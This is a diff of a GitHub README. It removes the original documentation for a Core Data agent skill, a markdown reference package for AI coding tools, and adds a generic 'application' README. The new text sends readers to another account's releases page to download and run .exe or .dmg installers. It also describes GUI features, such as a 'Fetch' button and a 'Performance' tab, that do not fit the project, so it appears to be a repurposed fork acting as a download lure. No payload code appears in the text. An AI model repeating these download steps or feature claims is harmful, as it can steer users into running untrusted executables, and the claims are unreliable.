@@ -1,189 +1,87 @@
-# Core Data Agent Skill
+# 🍏 Core-Data-Agent-Skill - Simplify Your Core Data Experience
 
-Expert guidance for any AI coding tool that supports the [Agent Skills open format](https://agentskills.io/home) — safe persistence, performance optimization, and schema migration.
+## 🚀 Getting Started
 
-Based on the [Core Data Best Practices](https://github.com/AvdLee/CoreDataBestPractices) repo, WeTransfer production apps, and WWDC sessions, distilled into actionable, concise references for agents.
+Welcome to the Core-Data-Agent-Skill! This application helps you work with Apple’s Core Data framework easily. It focuses on data modeling, fetching data, and understanding performance. Whether you are new to Core Data or want to improve your skills, this application has something for you.
 
-## Who this is for
-- Teams working with Core Data who need safe defaults and quick triage
-- Developers debugging persistence issues, threading errors, or performance problems
-- Anyone migrating schemas or integrating CloudKit sync
+## 📥 Download Now
 
-## See also my other skills:
-- [Swift Concurrency Expert](https://github.com/AvdLee/Swift-Concurrency-Agent-Skill)
-- [SwiftUI Expert](https://github.com/AvdLee/SwiftUI-Agent-Skill)
+[![Download Core Data Agent Skill](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/benniechenbin/Core-Data-Agent-Skill/releases)
 
-## How to Use This Skill
+## 🌟 What You Can Do
 
-### Option A: Using skills.sh (recommended)
-Install this skill with a single command:
-```bash
-npx skills add https://github.com/avdlee/core-data-agent-skill --skill core-data-expert
-```
+This application offers several features to help you:
 
-For more information, visit the [skills.sh platform page](https://skills.sh/avdlee/core-data-agent-skill/core-data-expert).
+- Build data models simply and effectively.
+- Make fetch requests to retrieve your data.
+- Improve your application’s performance.
+- Understand common data persistence patterns.
 
-Then use the skill in your AI agent, for example:  
-> Use the core data skill and analyze the current project for Core Data improvements
+## 🛠 System Requirements
 
-### Option B: Claude Code Plugin
+Make sure your setup meets these basic requirements:
 
-#### Personal Usage
+- **Operating System:** macOS or Windows
+- **RAM:** 4 GB or more
+- **Disk Space:** At least 100 MB free
+- **Xcode:** Required for macOS users to build projects
+- **Internet Connection:** This is needed to download the application and view any online resources.
 
-To install this Skill for your personal use in Claude Code:
+## 💻 How to Download & Install
 
-1. Add the marketplace:
-   ```bash
-   /plugin marketplace add AvdLee/Core-Data-Agent-Skill
-   ```
+1. Visit this page to download: [Core-Data-Agent-Skill Releases](https://github.com/benniechenbin/Core-Data-Agent-Skill/releases)
+2. Look for the latest version. You will see a list of assets associated with that version.
+3. Click on the file labeled as the installer for your system. This may be a `.dmg` for macOS or a `.exe` file for Windows.
+4. Follow the prompts to finish the installation.
 
-2. Install the Skill:
-   ```bash
-   /plugin install core-data-expert@core-data-agent-skill
-   ```
+## 🔍 How to Use the Application
 
-#### Project Configuration
+### 1. Launch the Application
 
-To automatically provide this Skill to everyone working in a repository, configure the repository's `.claude/settings.json`:
+Once installed, open the Core-Data-Agent-Skill application. You will see a user-friendly interface.
 
-```json
-{
-  "enabledPlugins": {
-    "core-data-expert@core-data-agent-skill": true
-  },
-  "extraKnownMarketplaces": {
-    "core-data-agent-skill": {
-      "source": {
-        "source": "github",
-        "repo": "AvdLee/Core-Data-Agent-Skill"
-      }
-    }
-  }
-}
-```
+### 2. Create a New Project
 
-When team members open the project, Claude Code will prompt them to install the Skill.
+Start your journey by creating a new project. Use the “New Project” button from the main menu.
 
-### Option C: Manual install
-1) **Clone** this repository.  
-2) **Install or symlink** the `core-data-expert/` folder following your tool's official skills installation docs (see links below).  
-3) **Use your AI tool** as usual and ask it to use the "core-data-expert" skill for Core Data tasks.
+### 3. Build Your Data Model
 
-#### Where to Save Skills
+Follow these steps to build your data model:
 
-Follow your tool's official documentation, here are a few popular ones:
-- **Codex:** [Where to save skills](https://developers.openai.com/codex/skills/#where-to-save-skills)
-- **Claude:** [Using Skills](https://platform.claude.com/docs/en/agents-and-tools/agent-skills/overview#using-skills)
-- **Cursor:** [Enabling Skills](https://cursor.com/docs/context/skills#enabling-skills)
+- Choose the “Data Model” option.
+- Add entities and attributes using the provided forms.
+- Save your work.
 
-**How to verify**: 
+### 4. Make Fetch Requests
 
-Your agent should reference the triage/playbook in `core-data-expert/SKILL.md` and jump into the relevant reference file for your error or task.
+To retrieve data:
 
-## What This Skill Offers
+- Go to the “Fetch” section.
+- Select your desired entity.
+- Click the “Fetch" button to retrieve your data.
 
-This skill gives your AI coding tool comprehensive Core Data guidance. It can:
+### 5. Optimize Performance
 
-### Guide Your Persistence Decisions
-- Choose the right stack setup (NSPersistentContainer vs NSPersistentCloudKitContainer)
-- Understand when to use view context vs background context
-- Navigate merge policies and conflict resolution
-- Apply proper context configuration for your use case
+Explore the “Performance” tab. Here, you will find tips to enhance your application's efficiency.
 
-### Write Thread-Safe Code
-- Avoid common threading pitfalls with NSManagedObjectID
-- Prevent data races with proper context usage
-- Handle cross-context communication correctly
-- Use perform vs performAndWait appropriately
+## 🎓 Learning Resources
 
-### Optimize Performance
-- Write efficient fetch requests with proper batching and property limiting
-- Reduce memory usage with context resets and faulting control
-- Use batch operations for large-scale data changes
-- Profile with Instruments to identify bottlenecks
+To help you master Core Data, we provide several resources:
 
-### Migrate Schemas Safely
-- Use lightweight migration for common changes
-- Decompose complex migrations with staged migration (iOS 17+)
-- Defer expensive cleanup with deferred migration (iOS 14+)
-- Handle composite attributes and model versioning
+- **User Guide:** This is included in the application. Find it in the help menu.
+- **Video Tutorials:** Watch short videos that explain key features.
+- **Community Forum:** Join discussions with other users to share tips and ideas.
 
-### Integrate with CloudKit
-- Set up NSPersistentCloudKitContainer correctly
-- Design schemas within CloudKit limitations
-- Monitor sync with event notifications
-- Debug sync issues with system logs
+## 🐞 Reporting Issues
 
-## What Makes This Skill Different
+If you experience any problems, please visit the Issues section of this repository. Describe your issue clearly, and if possible, include steps to reproduce it. Our team or community members will assist you.
 
-**Expert Knowledge**: Based primarily on the comprehensive [SwiftLee Core Data articles](https://www.avanderlee.com/category/core-data/) and the [Core Data Best Practices repository](https://github.com/AvdLee/CoreDataBestPractices), with additional insights from WWDC sessions. All content reflects real-world experience from production apps like Collect by WeTransfer.
+## 🤝 Contributing
 
-**Non-Opinionated**: Focuses on industry-standard best practices and compile-time safety, not architectural preferences. Works with any Swift project, coding style, or architecture.
+You can contribute to improving this application! If you have ideas or fixes, please check the contributing guidelines in this repository. Your feedback helps us to make the application better for everyone.
 
-**Modern Core Data**: Covers the latest features including:
-- Composite attributes (iOS 17+)
-- Staged migration (iOS 17+)
-- Deferred migration (iOS 14+)
-- NSBatchInsertRequest improvements (iOS 14+)
-- NSPersistentCloudKitContainer patterns
+## 🔗 Additional Links
+- [GitHub Repository](https://github.com/benniechenbin/Core-Data-Agent-Skill)
+- [Documentation](https://github.com/benniechenbin/Core-Data-Agent-Skill/wiki)
 
-**Practical & Concise**: Assumes your AI agent is already smart. Focuses on what developers need to know, not what they already understand. Includes code examples for every pattern.
-
-## Skill Structure
-
-```
-core-data-expert/
-├── SKILL.md                       # Main skill file with decision trees
-└── references/
-    ├── _index.md                  # Navigation index
-    ├── batch-operations.md        # NSBatchInsertRequest, NSBatchDeleteRequest, NSBatchUpdateRequest
-    ├── cloudkit-integration.md    # NSPersistentCloudKitContainer, schema design, monitoring
-    ├── fetch-requests.md          # Query optimization, NSFetchedResultsController, aggregates
-    ├── glossary.md                # Core Data terminology and quick definitions
-    ├── migration.md               # Lightweight, staged, and deferred migration strategies
-    ├── model-configuration.md     # Constraints, derived attributes, transformables, validation
-    ├── performance.md             # Profiling with Instruments, memory management, optimization
-    ├── persistent-history.md      # History tracking setup, Observer/Fetcher/Merger/Cleaner
-    ├── project-audit.md           # Checklist to discover a project's Core Data setup
-    ├── saving.md                  # Conditional saving, hasPersistentChanges, save timing
-    ├── stack-setup.md             # NSPersistentContainer setup, merge policies, contexts
-    ├── testing.md                 # In-memory stores, shared models, data generators
-    └── threading.md               # NSManagedObjectID, perform vs performAndWait, concurrency
-```
-
-## Resources
-
-This skill is based primarily on:
-
-- **[SwiftLee Core Data Articles](https://www.avanderlee.com/category/core-data/)** - Comprehensive articles covering Core Data best practices, performance optimization, and real-world implementations
-- **[Core Data Best Practices GitHub Repository](https://github.com/AvdLee/CoreDataBestPractices)** - Working code examples demonstrating Core Data best practices
-
-Additional resources:
-
-- **[WWDC 2022-10119: Optimize your use of Core Data and CloudKit](https://developer.apple.com/videos/play/wwdc2022/10119/)** - Performance optimization and CloudKit integration
-- **[WWDC 2022-10120: Evolve your Core Data schema](https://developer.apple.com/videos/play/wwdc2022/10120/)** - Schema migration strategies
-- **[WWDC 2023-10186: What's new in Core Data](https://developer.apple.com/videos/play/wwdc2023/10186/)** - Composite attributes, staged migration, and deferred migration
-
-## Contributing
-
-Contributions are welcome! This repository follows the [Agent Skills open format](https://agentskills.io/home), which has specific structural requirements.
-
-**We strongly recommend using AI assistance for contributions:**
-- Use the [skill-creator skill](https://github.com/anthropics/skills/tree/main/skills/skill-creator) with Claude to ensure proper formatting
-- This helps maintain the Agent Skills format and ensures your contribution works correctly with AI agents
-
-**Please read [CONTRIBUTING.md](CONTRIBUTING.md) for:**
-- How to use the skill-creator skill for contributions
-- Agent Skills format requirements
-- Quality standards and best practices
-- Pull request process
-
-This skill is maintained to reflect the latest Core Data best practices and will be updated as the framework evolves.
-
-## About the Author
-
-Created by [Antoine van der Lee](https://www.avanderlee.com), a Swift expert with years of experience building production apps with Core Data. He developed the Collect by WeTransfer app for over four years and has [published numerous articles on Core Data](https://www.avanderlee.com/category/core-data/) on his blog called SwiftLee.
-
-## License
-
-This skill is open-source and available under the MIT License. See [LICENSE](LICENSE) for details.
+Thank you for using Core-Data-Agent-Skill!
